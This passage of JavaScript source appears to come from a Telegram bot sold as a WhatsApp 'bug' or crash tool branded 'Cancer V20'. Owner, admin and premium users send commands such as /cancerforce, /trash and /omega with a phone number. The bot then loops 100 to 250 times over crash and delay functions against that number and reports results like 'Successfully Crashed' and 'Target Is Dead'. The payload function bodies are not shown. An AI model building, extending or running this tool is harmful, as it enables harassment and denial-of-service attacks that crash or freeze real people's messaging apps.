            `<b>Grup: ${ctx.chat.title}</b>\n\n` +
            `<pre><code class="language-yaml">` +
            `╔══════ ANTI FEATURES ══════╗\n\n` +
            antiFeatures.map(f =>
                `  ${f.icon} ${f.label.padEnd(14)}: ${getMurbugSetting(chatId, f.cmd) ? "AKTIF" : "NONAKTIF"}`
            ).join("\n") +
            `\n\n╚══════════════════════════╝` +
            `</code></pre>\n\n` +
            `<i>Toggle: /${antiFeatures.map(f => f.cmd).join(" | /")}</i>`
        );
    } catch (e) { console.log("listanti error:", e?.message); }
});

// ==========================================
// [ MAINTENANCE - OWNER ONLY ]
// ==========================================

bot.command("maintenance", async (ctx) => {
    if (!isOwner(ctx)) return ctx.replyWithHTML(
        "<blockquote>⚠️ Khusus Owner Only!</blockquote>"
    );

    try {
        saveMaintenance(true);
        return ctx.replyWithPhoto(MAINTENANCE_IMAGE, {
            caption:
                `<b>🔧 MAINTENANCE MODE DIAKTIFKAN</b>\n\n` +
                `<pre><code class="language-yaml">` +
                `  Status  : MAINTENANCE ON\n` +
                `  By      : ${ctx.from.first_name}\n` +
                `  Waktu   : ${getCurrentDate()}\n\n` +
                `  Semua user (grup & privat)\n` +
                `  tidak dapat menggunakan bot.\n` +
                `  Hanya Owner yang bisa akses.` +
                `</code></pre>`,
            parse_mode: "HTML"
        });
    } catch (e) { console.log("maintenance error:", e?.message); }
});

bot.command("offmaintenance", async (ctx) => {
    if (!isOwner(ctx)) return ctx.replyWithHTML(
        "<blockquote>⚠️ Khusus Owner Only!</blockquote>"
    );

    try {
        saveMaintenance(false);
        return ctx.replyWithHTML(
            `<b>✔️ MAINTENANCE DINONAKTIFKAN</b>\n\n` +
            `<pre><code class="language-yaml">` +
            `  Status  : ONLINE\n` +
            `  By      : ${ctx.from.first_name}\n` +
            `  Waktu   : ${getCurrentDate()}\n\n` +
            `  Bot sudah bisa digunakan\n` +
            `  oleh semua user kembali.` +
            `</code></pre>`,
            { parse_mode: "HTML" }
        );
    } catch (e) { console.log("offmaintenance error:", e?.message); }
});

// ==========================================
// [ BLOCKCMD - OWNER & ADMIN, GRUP ONLY ]
// /blockcmd omega → block fitur /omega di grup ini
// /delblockcmd omega → hapus block
// /listblockcmd → list semua yang diblock
// ==========================================

bot.command("blockcmd", async (ctx) => {
    if (!isGroup(ctx)) return ctx.replyWithHTML("<b>⚠️ Hanya untuk grup!</b>");
    if (!isOwnerOrAdmin(ctx.from.id)) return ctx.replyWithHTML("<blockquote>Owner & Admin Access Only</blockquote>");

    try {
        const args = ctx.message.text.split(" ");
        const cmd = args[1]?.toLowerCase().replace(/^\//, "");
        if (!cmd) return ctx.replyWithHTML(
            "<b>🚫 BLOCK CMD</b>\n" +
            "Format: <code>/blockcmd [nama_fitur]</code>\n" +
            "Contoh: <code>/blockcmd omega</code>"
        );

        const chatId = ctx.chat.id.toString();
        blockcmdData = loadBlockcmd();
        if (!Array.isArray(blockcmdData[chatId])) blockcmdData[chatId] = [];

        if (blockcmdData[chatId].includes(cmd)) {
            return ctx.replyWithHTML(`<b>⚠️ Fitur <code>/${cmd}</code> sudah diblock di grup ini!</b>`);
        }

        blockcmdData[chatId].push(cmd);
        saveBlockcmd(blockcmdData);

        await ctx.replyWithHTML(
            `<b>🚫 BLOCK CMD AKTIF</b>\n\n` +
            `├ Grup  : <code>${ctx.chat.title}</code>\n` +
            `└ Fitur : <code>/${cmd}</code>\n\n` +
            `<i>Fitur tersebut tidak dapat digunakan di grup ini.</i>`
        );
    } catch (e) { console.log("blockcmd error:", e?.message); }
});

bot.command("delblockcmd", async (ctx) => {
    if (!isGroup(ctx)) return ctx.replyWithHTML("<b>⚠️ Hanya untuk grup!</b>");
    if (!isOwnerOrAdmin(ctx.from.id)) return ctx.replyWithHTML("<blockquote>Owner & Admin Access Only</blockquote>");

    try {
        const args = ctx.message.text.split(" ");
        const cmd = args[1]?.toLowerCase().replace(/^\//, "");
        if (!cmd) return ctx.replyWithHTML(
            "<b>🗑️ DEL BLOCK CMD</b>\n" +
            "Format: <code>/delblockcmd [nama_fitur]</code>\n" +
            "Contoh: <code>/delblockcmd omega</code>"
        );

        const chatId = ctx.chat.id.toString();
        blockcmdData = loadBlockcmd();
        if (!Array.isArray(blockcmdData[chatId]) || !blockcmdData[chatId].includes(cmd)) {
            return ctx.replyWithHTML(`<b>⚠️ Fitur <code>/${cmd}</code> tidak ada di list block grup ini!</b>`);
        }

        blockcmdData[chatId] = blockcmdData[chatId].filter(c => c !== cmd);
        if (blockcmdData[chatId].length === 0) delete blockcmdData[chatId];
        saveBlockcmd(blockcmdData);

        await ctx.replyWithHTML(
            `<b>✔️ BLOCK DIHAPUS</b>\n\n` +
            `├ Grup  : <code>${ctx.chat.title}</code>\n` +
            `└ Fitur : <code>/${cmd}</code>\n\n` +
            `<i>Fitur tersebut sudah bisa digunakan kembali.</i>`
        );
    } catch (e) { console.log("delblockcmd error:", e?.message); }
});

bot.command("listblockcmd", async (ctx) => {
    if (!isGroup(ctx)) return ctx.replyWithHTML("<b>⚠️ Hanya untuk grup!</b>");
    if (!isOwnerOrAdmin(ctx.from.id)) return ctx.replyWithHTML("<blockquote>Owner & Admin Access Only</blockquote>");

    try {
        const chatId = ctx.chat.id.toString();
        blockcmdData = loadBlockcmd();
        const list = Array.isArray(blockcmdData[chatId]) ? blockcmdData[chatId] : [];

        if (list.length === 0) {
            return ctx.replyWithHTML(
                `<b>📋 LIST BLOCK CMD</b>\n\n` +
                `<i>Belum ada fitur yang diblock di grup ini.</i>`
            );
        }

        let txt = `<b>📋 LIST BLOCK CMD</b>\n`;
        txt += `<b>Grup: ${ctx.chat.title}</b>\n`;
        txt += `━━━━━━━━━━━━━━━━━━━━\n`;
        list.forEach((cmd, i) => {
            txt += `${i + 1}. <code>/${cmd}</code>\n`;
        });
        txt += `━━━━━━━━━━━━━━━━━━━━\n`;
        txt += `<i>Total: ${list.length} fitur diblock</i>`;

        await ctx.replyWithHTML(txt);
    } catch (e) { console.log("listblockcmd error:", e?.message); }
});

// ==========================================
// [ PRIVATE COMMANDS: Cancer1 - Cancer9 ]
// Syarat: isPrivate + isOwnerOrAdmin
// ==========================================

// ── HELPER PRIVATE BUG ──
async function sendBugCommand(ctx, opts) {
    if (!isPrivate(ctx)) return;
    if (!isOwnerOrAdmin(ctx.from.id)) {
        return ctx.replyWithHTML(
            "<blockquote>Owner & Admin Access Only</blockquote>\n" +
            "<b>Please Contact @xnnxdxc</b>"
        );
    }

    const q = ctx.message.text.split(" ")[1];
    const chatId = ctx.chat.id;
    const date = getCurrentDate();

    if (!q) return ctx.reply(`❌ Format : ${opts.format}`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    try {
        const sentMessage = await ctx.replyWithPhoto(
            IMAGES.thumb,
            {
                caption:
                    `<blockquote><b>Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs</b></blockquote>\n\n` +
                    `<tg-emoji emoji-id="5465137208878969279"></tg-emoji> Target : ${q}\n` +
                    `<tg-emoji emoji-id="5463081281048818043"></tg-emoji> Method : ${opts.method}\n` +
                    `<tg-emoji emoji-id="5778121946868749491"></tg-emoji> Status : Processing\n` +
                    `<tg-emoji emoji-id="5778212665167975922"></tg-emoji> Time   : ${date}\n\n` +
                    `<blockquote><code>Cancer TrashFlocks</code></blockquote>`,
                parse_mode: "HTML"
            }
        );

        console.log(chalk.white(`Process Sending Bugs To ${target}`));
        await opts.execute(target);
        console.log(chalk.magenta(`Success Sending Bugs To ${target}`));

        await ctx.telegram.editMessageCaption(
            chatId, sentMessage.message_id, null,
            `<blockquote><b>Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs</b></blockquote>\n\n` +
            `<tg-emoji emoji-id="5778121946868749491"></tg-emoji> Target : ${q}\n` +
            `<tg-emoji emoji-id="5778212665167975922"></tg-emoji> Method : ${opts.method}\n` +
            `<tg-emoji emoji-id="5465465194056525619"></tg-emoji> Status : Success Sending Bugs\n` +
            `<tg-emoji emoji-id="5465262274031659421"></tg-emoji> Time   : ${date}\n\n` +
            `<blockquote><code>Cancer TrashFlocks</code></blockquote>`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[
                        { text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "5778121946868749491" }
                    ]]
                }
            }
        );
    } catch (e) {
        console.log(`${opts.method} error:`, e?.message);
        await ctx.reply("❌ Terjadi kesalahan saat mengirim.").catch(() => {});
    }
}

// ── Cancer1 ──
bot.command("cancerforce", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    await sendBugCommand(ctx, {
        format: "/CancerForce 62xx",
        method: "CancerForce",
        execute: async (target) => {
            for (let i = 0; i < 150; i++) {
                await VnXNewForceImageTagSw(sock, target, mention = true);
                await VnXNewForceImageInvis(sock, target);
                await sleep(1000);
            }
        }
    });
});

// ── Cancer2 ──
bot.command("cancercombi", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    await sendBugCommand(ctx, {
        format: "/CancerCombi 62xx",
        method: "CancerCombi",
        execute: async (target) => {
            for (let i = 0; i < 100; i++) {
                await VnXNewForceImageInvis(sock, target);
                await SuperDelayByMia(sock, target);
                await sleep(1000);
            }
        }
    });
});

// ── Cancer3 ──
bot.command("cancerdelay", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    await sendBugCommand(ctx, {
        format: "/CancerDelay 62xx",
        method: "CancerDelay",
        execute: async (target) => {
            for (let i = 0; i < 100; i++) {
                await SuperDelayByMia(sock, target);
                await SuperSlowDelayByMia(sock, jid);
                await sleep(1000);
            }
        }
    });
});

// ── Cancer4 ──
bot.command("cancerblank", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    await sendBugCommand(ctx, {
        format: "/CancerBlank 62xx",
        method: "CancerCrashUi",
        execute: async (target) => {
            for (let i = 0; i < 100; i++) {
                await BlankDocumentByMia(client, target);
                await BlankMsg(sock, target);
                await BlankSistemUiByMia(client, target);
                await sleep(1000);
            }
        }
    });
});

// ── Cancer5 ──
bot.command("cancercombo", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    await sendBugCommand(ctx, {
        format: "/CancerCombo 62xx",
        method: "CancerCombo",
        execute: async (target) => {
            for (let i = 0; i < 100; i++) {
                await BlankSistemUiByMia(client, target);
                await SuperDelayByMia(sock, target)
                await sleep(1000);
            }
        }
    });
});

// ── Cancer6 ──
bot.command("Cancer6", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    await sendBugCommand(ctx, {
        format: "/Cancer6 62xx",
        method: "CancerDelayInvis",
        execute: async (target) => {
            for (let i = 0; i < 200; i++) {
                await Blast(target);
                await BoldType(target);
                await sleep(1000);
            }
        }
    });
});

// ── Cancer7 ──
bot.command("Cancer7", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    await sendBugCommand(ctx, {
        format: "/Cancer7 62xx",
        method: "CancerDelayHard",
        execute: async (target) => {
            for (let i = 0; i < 200; i++) {
                await BoldType(target);
                await sleep(1000);
            }
        }
    });
});

// ── Cancer8 ──
bot.command("Cancer8", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    await sendBugCommand(ctx, {
        format: "/Cancer8 62xx",
        method: "CancerCombo",
        execute: async (target) => {
            for (let i = 0; i < 200; i++) {
                await Blast(target);
                await BoldType(target);
                await InvisNoTag(sock, target);
                await sleep(1000);
            }
        }
    });
});

// ── Cancer9 ──
bot.command("Cancer9", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
    await sendBugCommand(ctx, {
        format: "/Cancer9 62xx",
        method: "CancerUi",
        execute: async (target) => {
            for (let i = 0; i < 100; i++) {
                await blank1(target);
                await blank2(target);
                await blank3(target);
                await blank5(target);
                await sleep(1000);
            }
        }
    });
});

// ==========================================
// HELPER - CEK SENDER
// ==========================================
// Map semua socket yang aktif: key = phoneNumber, value = sock
if (!global.activeSenders) global.activeSenders = new Map();

const getAnyActiveSock = () => {
    // Coba ambil dari activeSenders map dulu
    for (const [, s] of global.activeSenders) {
        if (s?.user && s?.ws?.readyState === 1) return s;
    }
    // Fallback ke global.conn
    if (global.conn?.user) return global.conn;
    if (global.waSocket?.user) return global.waSocket;
    return null;
};

const checkSender = async (ctx) => {
    const sock = getAnyActiveSock();
    if (!sock) {
        await ctx.replyWithHTML(
            `<b>❌ SENDER TIDAK TERSEDIA</b>\n\n` +
            `⌘ WhatsApp belum terhubung!\n` +
            `⌘ Gunakan <code>/addsender 628xxx</code> terlebih dahulu.`
        ).catch(() => {});
        return false;
    }
    return true;
};

// HELPER - CEK AKSES
const checkAccess = (ctx, murbugData, isVip) => {
    const isGroup = ctx.chat.type === "group" || ctx.chat.type === "supergroup";
    if (!isGroup) { ctx.reply("⚠️ Fitur ini hanya dapat digunakan di dalam grup!").catch(() => {}); return false; }
    if (!murbugData.includes(ctx.chat.id.toString())) { ctx.reply("❌ Grup ini tidak memiliki izin akses murbug!").catch(() => {}); return false; }
    if (!isVip) { ctx.reply("❌ Akses ditolak! Khusus User Premium/Admin/Owner.").catch(() => {}); return false; }
    return true;
};

// HELPER - LOAD DB
const loadDB = (ctx) => {
    const userId = ctx.from.id.toString();
    const murbugData = JSON.parse(fs.readFileSync('./database/murbug.json'));
    const isVip = JSON.parse(fs.readFileSync('./database/owner.json')).includes(userId) ||
                  JSON.parse(fs.readFileSync('./database/admin.json')).includes(userId) ||
                  JSON.parse(fs.readFileSync('./database/premium.json')).includes(userId);
    return { murbugData, isVip };
};

// GLOBAL ERROR HANDLER - PANEL TIDAK MATI
bot.catch((err, ctx) => {
    console.log(`[BOT ERROR] ${ctx?.updateType}:`, err?.message);
});

// ==========================================
// 1. COMMAND TRASH
// ==========================================
bot.command("trash", checkWhatsAppConnection, async (ctx) => {
    try {
        if (!await checkSender(ctx)) return;

        const q = ctx.message.text.split(" ")[1];
        const { murbugData, isVip } = loadDB(ctx);
        if (!checkAccess(ctx, murbugData, isVip)) return;
        if (!q) return ctx.reply("❌ Example: /trash 62xxx").catch(() => {});

        const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const sock = global.conn;
        const senderNum = sock.user?.id?.split(":")[0] || "Unknown";

        const msg = await ctx.replyWithPhoto(IMAGES.trash, {
            caption:
                `<blockquote><b>🔥 CANCER V20 — TRASH CRASH</b></blockquote>\n\n` +
                `<b>┌─── TARGET INFO ───────────</b>\n` +
                `<b>│</b> 🎯 Target  : <code>${q}</code>\n` +
                `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
                `<b>│</b> ⚔️ Method  : TRASH CRASH\n` +
                `<b>│</b> 🔁 Packets : 500x\n` +
                `<b>│</b> ⏱️ Interval: 2000ms\n` +
                `<b>└───────────────────────────</b>\n\n` +
                `<b>⚡ STATUS:</b> <code>🚀 Launching Attack...</code>`,
            parse_mode: "HTML"
        }).catch(() => null);

        // Background agar panel tidak timeout/mati
        setImmediate(async () => {
            for (let i = 0; i < 250; i++) {
                try { await VnXNewForceImageTagSw(sock, target, mention = true);
                await VnXNewForceImageInvis(sock, target); } catch (e) {}
                await sleep(2000);
            }
            await ctx.telegram.editMessageCaption(ctx.chat.id, msg?.message_id, null,
                `<blockquote><b>🏁 CANCER V20 — TRASH FINISHED</b></blockquote>\n\n` +
                `<b>┌─── RESULT ────────────────</b>\n` +
                `<b>│</b> 🎯 Target  : <code>${q}</code>\n` +
                `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
                `<b>│</b> ✔️ Status  : Successfully Crashed\n` +
                `<b>│</b> 📦 Sent    : 500 Packets\n` +
                `<b>│</b> 🛡️ Engine  : Forclose New\n` +
                `<b>└───────────────────────────</b>`,
                {
                    parse_mode: "HTML",
                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "5778212665167975922" }]] }
                }
            ).catch(() => {});
        });

    } catch (e) {
        console.log("trash error:", e?.message);
        await ctx.reply("❌ Error: " + (e?.message || "Unknown")).catch(() => {});
    }
});

// ==========================================
// 2. COMMAND INVASION
// ==========================================
bot.command("invasion", checkWhatsAppConnection, async (ctx) => {
    try {
        if (!await checkSender(ctx)) return;

        const q = ctx.message.text.split(" ")[1];
        const { murbugData, isVip } = loadDB(ctx);
        if (!checkAccess(ctx, murbugData, isVip)) return;
        if (!q) return ctx.reply("❌ Example: /invasion 62xxx").catch(() => {});

        const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const sock = global.conn;
        const senderNum = sock.user?.id?.split(":")[0] || "Unknown";

        const msg = await ctx.replyWithPhoto(IMAGES.invasion, {
            caption:
                `<blockquote><b>🌪️ CANCER V20 — INVASION LOOP</b></blockquote>\n\n` +
                `<b>┌─── TARGET INFO ───────────</b>\n` +
                `<b>│</b> 🎯 Target  : <code>${q}</code>\n` +
                `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
                `<b>│</b> ⚔️ Method  : INVASION LOOP\n` +
                `<b>│</b> 🔁 Packets : 250x\n` +
                `<b>│</b> ⏱️ Interval: 1000ms\n` +
                `<b>└───────────────────────────</b>\n\n` +
                `<b>⚡ STATUS:</b> <code>🚀 Launching Attack...</code>`,
            parse_mode: "HTML"
        }).catch(() => null);

        setImmediate(async () => {
            for (let i = 0; i < 100; i++) {
                try { await VnXNewForceImageInvis(sock, target);
                await DelayNoDetectByMia(sock, target)
                await VnXNewForceImageTagSw(sock, target, mention = true); } catch (e) {}
                await sleep(1000);
            }
            await ctx.telegram.editMessageCaption(ctx.chat.id, msg?.message_id, null,
                `<blockquote><b>🏁 CANCER V20 — INVASION FINISHED</b></blockquote>\n\n` +
                `<b>┌─── RESULT ────────────────</b>\n` +
                `<b>│</b> 🎯 Target  : <code>${q}</code>\n` +
                `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
                `<b>│</b> ✔️ Status  : Database Destroyed\n` +
                `<b>│</b> 📦 Sent    : 250 Packets\n` +
                `<b>└───────────────────────────</b>`,
                {
                    parse_mode: "HTML",
                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "5778212665167975922" }]] }
                }
            ).catch(() => {});
        });

    } catch (e) {
        console.log("invasion error:", e?.message);
        await ctx.reply("❌ Error: " + (e?.message || "Unknown")).catch(() => {});
    }
});

// ==========================================
// 3. COMMAND OMEGA
// ==========================================
bot.command("omega", checkWhatsAppConnection, async (ctx) => {
    try {
        if (!await checkSender(ctx)) return;

        const q = ctx.message.text.split(" ")[1];
        const { murbugData, isVip } = loadDB(ctx);
        if (!checkAccess(ctx, murbugData, isVip)) return;
        if (!q) return ctx.reply("❌ Example: /omega 62xxx").catch(() => {});

        const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const sock = global.conn;
        const senderNum = sock.user?.id?.split(":")[0] || "Unknown";

        const msg = await ctx.replyWithPhoto(IMAGES.omega, {
            caption:
                `<blockquote><b>🌌 CANCER V20 — OMEGA FATAL</b></blockquote>\n\n` +
                `<b>┌─── TARGET INFO ───────────</b>\n` +
                `<b>│</b> 🎯 Target  : <code>${q}</code>\n` +
                `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
                `<b>│</b> ⚔️ Method  : OMEGA FATAL\n` +
                `<b>│</b> 🔁 Packets : 250x\n` +
                `<b>│</b> ⏱️ Interval: 100ms\n` +
                `<b>└───────────────────────────</b>\n\n` +
                `<b>⚡ STATUS:</b> <code>🚀 Launching Attack...</code>`,
            parse_mode: "HTML"
        }).catch(() => null);

        setImmediate(async () => {
            for (let i = 0; i < 100; i++) {
                try { await FcDelayV1ByMia(client, target);
                await DelayNoDetectByMia(sock, target); } catch (e) {}
                await sleep(1500);
            }
            await ctx.telegram.editMessageCaption(ctx.chat.id, msg?.message_id, null,
                `<blockquote><b>🏁 CANCER V20 — OMEGA FINISHED</b></blockquote>\n\n` +
                `<b>┌─── RESULT ────────────────</b>\n` +
                `<b>│</b> 🎯 Target  : <code>${q}</code>\n` +
                `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
                `<b>│</b> ✔️ Status  : Target Confirmed Offline\n` +
                `<b>│</b> 📦 Sent    : 250 Packets\n` +
                `<b>└───────────────────────────</b>`,
                {
                    parse_mode: "HTML",
                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "5778212665167975922" }]] }
                }
            ).catch(() => {});
        });

    } catch (e) {
        console.log("omega error:", e?.message);
        await ctx.reply("❌ Error: " + (e?.message || "Unknown")).catch(() => {});
    }
});

// ==========================================
// 4. COMMAND KUANTUM
// ==========================================
bot.command("kuantum", checkWhatsAppConnection, async (ctx) => {
    try {
        if (!await checkSender(ctx)) return;

        const q = ctx.message.text.split(" ")[1];
        const { murbugData, isVip } = loadDB(ctx);
        if (!checkAccess(ctx, murbugData, isVip)) return;
        if (!q) return ctx.reply("❌ Example: /kuantum 62xxx").catch(() => {});

        const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const sock = global.conn;
        const senderNum = sock.user?.id?.split(":")[0] || "Unknown";

        const msg = await ctx.replyWithPhoto(IMAGES.kuantum, {
            caption:
                `<blockquote><b>☢️ CANCER V20 — KUANTUM LOGIC</b></blockquote>\n\n` +
                `<b>┌─── TARGET INFO ───────────</b>\n` +
                `<b>│</b> 🎯 Target  : <code>${q}</code>\n` +
                `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
                `<b>│</b> ⚔️ Method  : KUANTUM LOGIC\n` +
                `<b>│</b> 🔁 Packets : 250x\n` +
                `<b>│</b> ⏱️ Interval: 1000ms\n` +
                `<b>└───────────────────────────</b>\n\n` +
                `<b>⚡ STATUS:</b> <code>🚀 Launching Attack...</code>`,
            parse_mode: "HTML"
        }).catch(() => null);

        setImmediate(async () => {
            for (let i = 0; i < 100; i++) {
                try { await SuperDelayByMia(sock, target);
                await SuperSlowDelayByMia(sock, jid); } catch (e) {}
                await sleep(1500);
            }
            await ctx.telegram.editMessageCaption(ctx.chat.id, msg?.message_id, null,
                `<blockquote><b>🏁 CANCER V20 — KUANTUM FINISHED</b></blockquote>\n\n` +
                `<b>┌─── RESULT ────────────────</b>\n` +
                `<b>│</b> 🎯 Target  : <code>${q}</code>\n` +
                `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
                `<b>│</b> ✔️ Status  : Successfully Overloaded\n` +
                `<b>│</b> 📦 Sent    : 250 Packets\n` +
                `<b>└───────────────────────────</b>`,
                {
                    parse_mode: "HTML",
                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "5778212665167975922" }]] }
                }
            ).catch(() => {});
        });

    } catch (e) {
        console.log("kuantum error:", e?.message);
        await ctx.reply("❌ Error: " + (e?.message || "Unknown")).catch(() => {});
    }
});

// ==========================================
// 5. COMMAND MODOLS
// ==========================================
bot.command("modols", checkWhatsAppConnection, async (ctx) => {
    try {
        if (!await checkSender(ctx)) return;

        const q = ctx.message.text.split(" ")[1];
        const { murbugData, isVip } = loadDB(ctx);
        if (!checkAccess(ctx, murbugData, isVip)) return;
        if (!q) return ctx.reply("❌ Example: /modols 62xxx").catch(() => {});

        const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const sock = global.conn;
        const senderNum = sock.user?.id?.split(":")[0] || "Unknown";

        const msg = await ctx.replyWithPhoto(IMAGES.modols, {
            caption:
                `<blockquote><b>☣️ CANCER V20 — MODOLS TOXIC</b></blockquote>\n\n` +
                `<b>┌─── TARGET INFO ───────────</b>\n` +
                `<b>│</b> 🎯 Target  : <code>${q}</code>\n` +
                `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
                `<b>│</b> ⚔️ Method  : MODOLS TOXIC\n` +
                `<b>│</b> 🔁 Packets : 250x\n` +
                `<b>│</b> ⏱️ Interval: 100ms\n` +
                `<b>└───────────────────────────</b>\n\n` +
                `<b>⚡ STATUS:</b> <code>🚀 Launching Attack...</code>`,
            parse_mode: "HTML"
        }).catch(() => null);

        setImmediate(async () => {
            for (let i = 0; i < 100; i++) {
                try { await BlankDocumentByMia(client, target);
                await BlankMsg(sock, target) } catch (e) {}
                await sleep(1500);
            }
            await ctx.telegram.editMessageCaption(ctx.chat.id, msg?.message_id, null,
                `<blockquote><b>🏁 CANCER V20 — MODOLS FINISHED</b></blockquote>\n\n` +
                `<b>┌─── RESULT ────────────────</b>\n` +
                `<b>│</b> 🎯 Target  : <code>${q}</code>\n` +
                `<b>│</b> 📡 Sender  : <code>${senderNum}</code>\n` +
                `<b>│</b> ✔️ Status  : Target Is Dead\n` +
                `<b>│</b> 📦 Sent    : 250 Packets\n` +
                `<b>└───────────────────────────</b>`,
                {
                    parse_mode: "HTML",
                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: "Danger", icon_custom_emoji_id: "5778212665167975922" }]] }
                }
            ).catch(() => {});
        });

    } catch (e) {
        console.log("modols error:", e?.message);
        await ctx.reply("❌ Error: " + (e?.message || "Unknown")).catch(() => {});
    }
});

// ~ Function Bugs ~ \\

// ~ End Function Bugs ~ \\
// ==================
// GLOBAL ERROR HANDLER (SAFE)
// ==================

process.on('uncaughtException', (err) => {
    console.log('[SAFE] Uncaught:', err?.message || err);
});

process.on('unhandledRejection', (reason) => {
    console.log('[SAFE] Rejection:', reason?.message || reason);
});